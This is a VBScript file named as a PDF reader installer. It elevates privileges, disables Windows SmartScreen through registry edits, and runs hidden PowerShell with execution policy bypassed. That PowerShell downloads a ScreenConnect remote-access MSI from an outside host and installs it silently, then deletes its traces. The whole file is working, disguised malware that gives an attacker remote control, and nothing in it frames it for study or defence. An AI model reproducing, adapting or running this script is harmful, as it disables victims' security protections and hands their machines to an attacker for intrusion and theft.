' pdf_Reader_en_install.vbs - VBScript Version
' Purpose: Silently installs ScreenConnect and disables Windows SmartScreen.

Option Explicit

Dim shell, fso, tempDir, logPath
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
tempDir = shell.ExpandEnvironmentStrings("%TEMP%")
logPath = tempDir & "\disable-and-install.log"

Sub LogMsg(msg)
    On Error Resume Next
    Dim file
    Set file = fso.OpenTextFile(logPath, 8, True)
    file.WriteLine "[" & Now & "] " & msg
    file.Close
    If Err.Number <> 0 Then
        ' Fallback
        Dim fallbackLog
        fallbackLog = "C:\Windows\Temp\disable-and-install.log"
        Set file = fso.OpenTextFile(fallbackLog, 8, True)
        file.WriteLine "[" & Now & "] " & msg
        file.Close
    End If
    On Error GoTo 0
End Sub

Sub LogError(msg, errObj)
    Dim fullMsg
    fullMsg = msg
    If Not IsEmpty(errObj) Then
        fullMsg = fullMsg & " - Error: " & errObj.Description
    End If
    LogMsg "ERROR: " & fullMsg
End Sub

LogMsg "========================================"
LogMsg "Script started: good.vbs"

' 1. Check for Elevation
Dim args, i, elevated
elevated = False
For i = 0 To WScript.Arguments.Count - 1
    If WScript.Arguments(i) = "/elevate" Then
        elevated = True
        Exit For
    End If
Next

If Not elevated Then
    LogMsg "Not running as admin. Requesting elevation..."
    Dim shellApp, scriptPath
    Set shellApp = CreateObject("Shell.Application")
    scriptPath = WScript.ScriptFullName
    args = """" & scriptPath & """"
    
    For i = 0 To WScript.Arguments.Count - 1
        Dim arg
        arg = WScript.Arguments(i)
        If InStr(arg, "http") = 1 Then
            args = args & " """ & arg & """"
        End If
    Next
    args = args & " /elevate"
    shellApp.ShellExecute "cscript.exe", "//nologo //B " & args, "", "runas", 0
    WScript.Quit
End If

LogMsg "Running with administrator privileges"

' 2. Disable SmartScreen via Registry
On Error Resume Next
LogMsg "Step 1: Disabling SmartScreen..."
Dim regPath1, regPath2, regPath3, gpPath
regPath1 = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"
regPath2 = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost"
regPath3 = "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost"
gpPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System"

shell.Run "reg add """ & regPath1 & """ /f", 0, True
shell.Run "reg add """ & regPath1 & """ /v ""SmartScreenEnabled"" /t REG_SZ /d ""Off"" /f", 0, True

shell.Run "reg add """ & regPath2 & """ /f", 0, True
shell.Run "reg add """ & regPath2 & """ /v ""EnableWebContentEvaluation"" /t REG_DWORD /d 0 /f", 0, True

shell.Run "reg add """ & regPath3 & """ /f", 0, True
shell.Run "reg add """ & regPath3 & """ /v ""EnableWebContentEvaluation"" /t REG_DWORD /d 0 /f", 0, True

shell.Run "reg add """ & gpPath & """ /f", 0, True
shell.Run "reg add """ & gpPath & """ /v ""EnableSmartScreen"" /t REG_DWORD /d 0 /f", 0, True

If Err.Number <> 0 Then
    LogError "SmartScreen disable failed", Err
End If
On Error GoTo 0

' 3. Download and Install MSI
Dim downloadUrl
downloadUrl = "https://sc.atffirst.online/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
For i = 0 To WScript.Arguments.Count - 1
    Dim argUrl
    argUrl = WScript.Arguments(i)
    If argUrl <> "/elevate" And InStr(argUrl, "/") <> 1 And InStr(argUrl, "http") = 1 Then
        downloadUrl = argUrl
        Exit For
    End If
Next

Dim msiPath, psPath
msiPath = "C:\Windows\Temp\Installer.msi"
psPath = "C:\Windows\Temp\download.ps1"

On Error Resume Next
LogMsg "Starting download from: " & downloadUrl
Dim psScript, f
psScript = "$ErrorActionPreference = ""Stop""; try { " & _
           "(New-Object System.Net.WebClient).DownloadFile(""" & downloadUrl & """, """ & msiPath & """); " & _
           "Exit 0 } catch { Exit 1 }"

Set f = fso.CreateTextFile(psPath, True)
f.Write psScript
f.Close

Dim exitCode
exitCode = shell.Run("powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File """ & psPath & """", 0, True)

If exitCode = 0 And fso.FileExists(msiPath) Then
    LogMsg "Download successful. Starting MSI installation..."
    shell.Run "msiexec /i """ & msiPath & """ /qn /norestart", 0, True
    WScript.Sleep 3000
    fso.DeleteFile msiPath
    LogMsg "Installation completed successfully."
Else
    LogMsg "Download failed or file not found."
End If

If fso.FileExists(psPath) Then fso.DeleteFile psPath

If Err.Number <> 0 Then
    LogError "Installation process failed", Err
End If
On Error GoTo 0

LogMsg "Script completed."
WScript.Quit 0
